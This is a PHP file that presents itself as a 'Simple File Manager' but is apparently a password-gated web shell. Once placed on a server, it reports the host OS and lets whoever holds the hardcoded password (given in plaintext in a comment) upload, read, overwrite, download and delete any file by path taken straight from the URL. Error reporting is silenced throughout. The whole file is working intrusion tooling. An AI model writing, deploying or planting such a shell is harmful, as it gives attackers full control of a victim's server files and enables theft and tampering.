<!DOCTYPE html>
<html>
<head>
	<title>Simple File Manager</title>
</head>
<body>
	
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">

	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.6.3/css/all.min.css"  />

	<script type="text/javascript">

		function addUrlParameter(nama, value){
			var newURL = location.href.split("?search")[0];
			window.history.pushState('object',document.title,newURL);

			var searchParams = new URLSearchParams(window.location.search)
			searchParams.set(nama,value)
			
			window.location.search = searchParams.toString()

		}

		function deleteFile(nama, value){

			if (confirm("Yakin Delete!") == true) {
				addUrlParameter(nama,value);
			} else {
				console.log('cancel');
			}

		}


	</script>

	<?php

	error_reporting(0);
	session_start();
	// session_destroy();
	

	$password = "b68b70b4fa5d1aa81292d4ceb48fcca7"; //md5 : openfile
	
	if (isset($_POST['password'])) {
		
		$_SESSION['password'] = md5($_POST['password']);

	}

	if (strval($_SESSION['password'])!=$password) {
		echo '<form action="" method="post" >';
		echo '<input type="text" name="password" size="50"> <input type="submit" id="_upl" value="Login"></form>';
		die();
	}



	echo 'User Agent: '.$_SERVER['HTTP_USER_AGENT'];
	echo "<br>";


	function path() {
		if(isset($_GET['dir'])) {
			$dir = str_replace("\\", "/", $_GET['dir']);
			@chdir($dir);
		} else {
			$dir = str_replace("\\", "/", getcwd());
		}
		return $dir;
	}
	function windisk() {
		$letters = "";
		$v = explode("\\", path());
		$v = $v[0];
		foreach(range("A", "Z") as $letter) {
			$bool = $isdiskette = in_array($letter, array("A"));
			if(!$bool) $bool = is_dir("$letter:\\");
			if($bool) {
				$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
				if($letter.":" != $v) {
					$letters .= $letter;
				}
				else {
					$letters .= color(1, 2, $letter);
				}
				$letters .= "</a> ]";
			}
		}
		if(!empty($letters)) {
			print "Drives : $letters<br>";
		}
		if(count($quicklaunch) > 0) {
			foreach($quicklaunch as $item) {
				$v = realpath(path(). "..");
				if(empty($v)) {
					$a = explode(DIRECTORY_SEPARATOR,path());
					unset($a[count($a)-2]);
					$v = join(DIRECTORY_SEPARATOR, $a);
				}
				print "<a href='".$item[1]."'>".$item[0]."</a>";
			}
		}
	}
	function OS() {
		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
	}

	if (isset($_GET['act'])) {
		if ($_GET['act']=="download") {
			@ob_clean();

			$file_path = $_GET['dir'].$_GET['f'];
			$filename = $_GET['f'];
			

			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="'.basename($file).'"');

			header("Content-Type: application/octet-stream");
			header("Content-Transfer-Encoding: Binary");
			header("Content-disposition: attachment; filename=\"".$filename."\""); 
			header('Expires: 0');
			header('Cache-Control: must-revalidate');
			header('Pragma: public');
			header('Content-Length: ' . filesize($file_path));
			readfile($file_path);
			exit;
		}elseif ($_GET['act']=="delete") {
			$file_path = $_GET['dir'].$_GET['f'];
			if(file_exists($file_path)) {

				echo "<script>alert('Berhasil Delete')</script>";
				unlink($file_path);
			} 
		}
	}



	echo "<br>";
	echo "OS : ".OS();
	echo ' <b>('.php_uname().')</b>';
	echo "<br>";
	echo '<br/><div style="float: right;margin-right:20%;">';
	echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
	if( $_POST['_upl'] == "Upload" ) {
		if(@copy($_FILES['file']['tmp_name'], $_GET['dir'].$_FILES['file']['name'])) { echo '<b>Upload Sukses Ngab !!!</b><br><br>'; }
		else { echo '<b>JANCOO** !!! Upload GAGAL !!!</b><br><br>'; }
	}
	echo "</div>";
	echo "<br>";
	echo windisk();
	echo "<br>";

	echo "<br>";
	$basefile = explode("/",$_SERVER['SCRIPT_NAME']);
	// echo path();
	$path = explode("/",path());

	echo '<a href="'.$basefile[count($basefile)-1].'"><li class="fa fa-home"></li></a> ';
	foreach ($path as $key => $value) {
		if ($key>0) {
			$temp_dir .= $path[$key-1].'/';
			$direktori = $temp_dir.$value;
		}else{
			$temp_dir .= $path[$key-1];
			$direktori = $value.'/';
		}


		echo '<a href="?dir='.$direktori.'/">'.$value.'</a>/';
	}


	$dir = path();	

	echo '<ul class="list-group list-group-flush">';

	$variable = (scandir($dir));
	foreach ($variable as $key => $value) {

		if (is_dir($value)) {
			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a href="?dir=' .path().'/'.$value."/".'"><i class="fas fa-folder-close"></i>'.$value.'</a></li>';
		}
	}

	foreach ($variable as $key => $value) {
		if (!is_dir($value)) {
			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a style="cursor: pointer;" onclick="addUrlParameter('."'f','" .$value."'".')"><i class="fas fa-file-alt"></i>'.$value.'</a></li>';
		}
	}

	echo "</ul>";





	if (isset($_GET['f'])) {

		if (isset($_POST['code'])) {
			$file = fopen($_GET['f'],"w");
			fwrite($file,$_POST['code']);
			fclose($file);
		}

		echo '<div class="card card-body"><form method="POST">';

		$myfile = fopen($_GET['dir'].$_GET['f'], "r") or die("Unable to open file!");
		echo '<textarea name="code" class="form-control" rows="20" autofocus>'.htmlspecialchars(fread($myfile,filesize($_GET['dir'].$_GET['f']))).'</textarea>';
		fclose($myfile);

		echo '<div class="col-sm-4"><input type="submit" class="btn btn-primary" name="" value="Edit"/></div>
		</form> 
		<div class="col-sm-4"><button class="btn btn-success" onclick="addUrlParameter('."'act','download'".')">Download</button>
		<button class="btn btn-danger" onclick="deleteFile('."'act','delete'".');">delete</button></div>
		</div>';
	}

	?>


</body>
</html>
